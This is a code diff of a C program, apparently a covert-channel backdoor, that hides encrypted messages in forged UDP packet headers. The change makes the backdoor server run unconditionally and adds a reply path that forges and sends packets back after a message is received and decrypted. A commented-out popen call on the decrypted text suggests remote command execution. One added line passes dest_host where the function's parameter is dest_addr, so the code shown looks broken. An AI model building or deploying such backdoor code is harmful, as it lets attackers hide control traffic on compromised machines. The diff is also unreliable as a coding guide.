@@ -93,13 +93,10 @@ int main(int argc, char **argv)
         client(source_host, dest_host, dest_port, ciphertext, cypher_len);
         fprintf(stdout, "\nPackets Sent\n\n");
     }
-    else
-    {
-        fprintf(stdout, "Backdoor..\n");
 
-        server(source_host, dest_port);
-        fprintf(stdout, "\nData Received\n\n");
-    }
+    fprintf(stdout, "Backdoor..\n");
+    server(source_host, dest_host, dest_port);
+    fprintf(stdout, "\nData Received\n\n");
 
     return 0;
 }
@@ -258,7 +255,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  * Server function for unvealing the message from the UDP header and
  * writing the the message to a file.
  * -----------------------------------------------------------------------*/
-void server(unsigned int source_addr, unsigned short dest_port)
+void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port)
 {
     // FILE *fp;
     int recv_socket;
@@ -312,8 +309,14 @@ void server(unsigned int source_addr, unsigned short dest_port)
                     // fp = popen(decryptedtext, "r");
 
                     // Read then send
+                    int cypher_len = 0;
+                    unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
+                    cypher_len = forgepacket(ciphertext);
+                    client(source_addr, dest_host, dest_port, ciphertext, cypher_len);
 
                     // open = false;
+                    packet_counter = 0;
+                    size = 0;
                 }
             }
         }
